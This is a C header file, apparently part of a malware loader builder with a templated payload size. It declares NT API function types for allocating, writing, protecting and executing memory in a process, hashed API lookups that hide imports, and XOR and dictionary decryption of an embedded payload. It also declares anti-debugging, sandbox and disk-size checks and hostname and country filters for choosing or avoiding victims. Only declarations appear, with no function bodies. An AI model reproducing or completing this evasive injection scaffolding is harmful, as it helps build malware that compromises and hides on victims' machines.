#ifndef DEFINITIONS_H
#define DEFINITIONS_H

#include <windows.h>
#include <stdio.h>
#include <time.h>
#include <stdint.h>

#define ASSOCATION_TABLE_SIZE 256


typedef enum { false, true } bool;

typedef struct {
    unsigned int value;
    uint8_t rotation_value;
    bool is_rotation_right;
} ObjHash;

typedef struct {
    char *word;
    uint8_t byte;
} Association;

extern const Association association_table[ASSOCATION_TABLE_SIZE];

typedef NTSTATUS (NTAPI* NtAllocVirtMem)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

typedef NTSTATUS(NTAPI* NtWriteVirtMem)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    ULONG NumberOfBytesToWrite,
    PULONG NumberOfBytesWritten
);

typedef NTSTATUS(NTAPI* NtProtectVirtMem)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T NumberOfBytesToProtect,
    ULONG NewAccessProtection,
    PULONG OldAccessProtection
);

typedef NTSTATUS(NTAPI* NtCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PCRYPT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    ULONG_PTR ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
);

typedef NTSTATUS(NTAPI* NtWaitForSingleObj)(
    HANDLE Handle,
    BOOLEAN Alertable,
    PLARGE_INTEGER Timeout
);

typedef BOOL(WINAPI* GetComputerNameFunc)(
    LPSTR lpBuffer,
    LPDWORD lpnSize
);

typedef BOOL(WINAPI *GetDiskFreeSpaceExFuncA)(
    LPCSTR,
    PULARGE_INTEGER,
    PULARGE_INTEGER,
    PULARGE_INTEGER
);

typedef void (WINAPI *GetSystemInfoFunc)(LPSYSTEM_INFO);
typedef BOOL (WINAPI *GlobalMemoryStatusExFunc)(LPMEMORYSTATUSEX);

typedef uint16_t(WINAPI *GetSystemDefaultLangIDFunc)(void);
typedef uint16_t(WINAPI *GetSystemDefaultLCIDFunc)(void);



extern const ObjHash NTDLL_HASH;
extern const ObjHash KERNEL32_HASH;

extern const ObjHash QUERY_INFORMATION_PROCESS_HASH;
extern const ObjHash GET_COMPUTER_NAME_HASH;
extern const ObjHash GET_DISK_FREE_SPACE_HASH;
extern const ObjHash GET_SYSTEM_INFO_HASH;
extern const ObjHash GLOBAL_MEMORY_STATUS_HASH;
extern const ObjHash GET_SYSTEM_DEFAULT_LANGID_HASH;
extern const ObjHash GET_SYSTEM_DEFAULT_LCID_HASH;
extern const ObjHash LOAD_LIBRARY_HASH;

extern const ObjHash VIRTUAL_ALLOC_HASH;
extern const ObjHash WRITE_MEMORY_HASH;
extern const ObjHash VIRTUAL_PROTECT_HASH;
extern const ObjHash CREATE_THREAD_HASH;
extern const ObjHash WAIT_FOR_SINGLE_OBJECT_HASH;

#define AVOIDED_HOSTNAME_PREFIX_HASHES_COUNT  (sizeof(AVOIDED_HOSTNAME_PREFIX_HASHES) / sizeof(AVOIDED_HOSTNAME_PREFIX_HASHES[0]))

extern const ObjHash TARGET_HOSTNAME_PREFIX_HASH;
extern const ObjHash AVOIDED_HOSTNAME_PREFIX_HASHES[];
extern const uint16_t AVOIDED_COUNTRIES[];

extern const size_t AVOIDED_HOSTNAME_PREFIX_HASHES_SIZE;
extern const size_t AVOIDED_COUNTRIES_SIZE;

extern unsigned char payload[%PAYLOAD_SIZE%];
extern const char* dict_payload;


void XOR(unsigned char *data, size_t len, uint16_t key);
void DICT_decrypt(const char* dict_payload);

HMODULE CustomGetModuleHandle(ObjHash module_hash);
FARPROC CustomGetProcAdress(IN HMODULE hModule, ObjHash function_hash);

bool is_being_debugged();
int get_disk_size(HMODULE hKernel32dll);
bool is_valid_computer(HMODULE hKernel32);
const char* get_hostname(HMODULE hKernel32dll);
bool is_valid_language(HMODULE hKernel32dll);
unsigned int RO(const char* str, uint8_t rotation_value, bool is_rotation_right);

bool is_string_matching_prefixHash(const char* str, ObjHash prefix_hash);
bool is_valid_hostname(const char* hostname);
bool is_objhash(ObjHash obj_hash);

int divide(int a, int b);
int multiply(int a, int b);
int add(int a, int b);
int substract(int a, int b);

#endif // DEFINITIONS_H
